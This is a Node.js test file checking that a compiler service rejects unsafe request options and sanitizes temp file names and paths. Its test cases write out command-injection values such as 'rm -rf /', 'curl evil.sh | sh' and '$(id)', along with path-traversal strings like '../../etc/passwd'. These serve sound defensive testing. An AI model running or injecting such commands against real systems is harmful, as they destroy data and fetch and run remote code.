import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import {
  MAX_CODE_SIZE,
  TEMP_DIR,
  makeSourceFilename,
  parseCompileOptions,
  resolveTempPath,
} from '../src/lib/compiler.ts';

test('parseCompileOptions accepts valid input', () => {
  const result = parseCompileOptions({ code: 'console.log(1)', target: 'c', platform: 'linux', arch: 'x64' });
  assert.ok(!('error' in result));
  assert.equal(result.target, 'c');
  assert.equal(result.platform, 'linux');
});

test('parseCompileOptions requires code', () => {
  assert.deepEqual(parseCompileOptions({}), { error: 'Code is required' });
  assert.deepEqual(parseCompileOptions(null), { error: 'Invalid request body' });
  assert.deepEqual(parseCompileOptions({ code: 42 }), { error: 'Code is required' });
});

test('parseCompileOptions rejects values that are not in the allow-list', () => {
  for (const [key, value] of [
    ['target', 'exe; rm -rf /'],
    ['platform', 'linux && curl evil.sh | sh'],
    ['arch', '$(id)'],
    ['optimization', 'O2 --linker /bin/sh'],
  ]) {
    assert.deepEqual(parseCompileOptions({ code: 'x', [key]: value }), { error: `Invalid ${key}` });
  }
});

test('parseCompileOptions rejects oversized code', () => {
  const result = parseCompileOptions({ code: 'a'.repeat(MAX_CODE_SIZE + 1) });
  assert.ok('error' in result);
});

test('makeSourceFilename strips path traversal and shell metacharacters', () => {
  for (const evil of ['../../etc/passwd', 'a; rm -rf ~ #.ts', '$(touch /tmp/pwned).ts', '`id`.ts', 'x\n.ts']) {
    const name = makeSourceFilename(evil);
    assert.match(name, /^[0-9a-f]{32}(-[A-Za-z0-9_-]+)?\.ts$/, `unsafe name for ${JSON.stringify(evil)}: ${name}`);
    assert.ok(resolveTempPath(name), `generated name should resolve: ${name}`);
  }
});

test('makeSourceFilename keeps a readable suffix and is unique', () => {
  const a = makeSourceFilename('my-app.ts');
  const b = makeSourceFilename('my-app.ts');
  assert.match(a, /-my-app\.ts$/);
  assert.notEqual(a, b);
  assert.match(makeSourceFilename(), /^[0-9a-f]{32}\.ts$/);
});

test('resolveTempPath only resolves plain files inside TEMP_DIR', () => {
  assert.equal(resolveTempPath('abc123.wasm'), path.join(TEMP_DIR, 'abc123.wasm'));
  for (const evil of ['../package.json', '..', '.env', 'a/../../b', '/etc/passwd', 'a\\..\\b', 'foo..bar', '', 'a"b']) {
    assert.equal(resolveTempPath(evil), null, `should reject ${JSON.stringify(evil)}`);
  }
});
